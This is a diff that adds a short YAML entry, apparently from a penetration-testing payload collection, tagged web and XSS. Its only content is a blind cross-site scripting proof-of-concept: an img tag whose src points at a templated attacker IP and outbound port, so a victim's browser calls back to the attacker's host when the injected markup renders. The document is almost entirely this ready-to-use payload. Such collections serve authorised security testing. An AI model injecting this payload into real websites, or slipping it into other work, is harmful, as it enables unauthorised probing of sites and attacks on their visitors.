@@ -1,0 +1,8 @@
+metadata:
+  filename: "xss-blind-img-src-poc-callback.yaml"
+  tags: ["web", "xss"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <img src='http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/test'/>
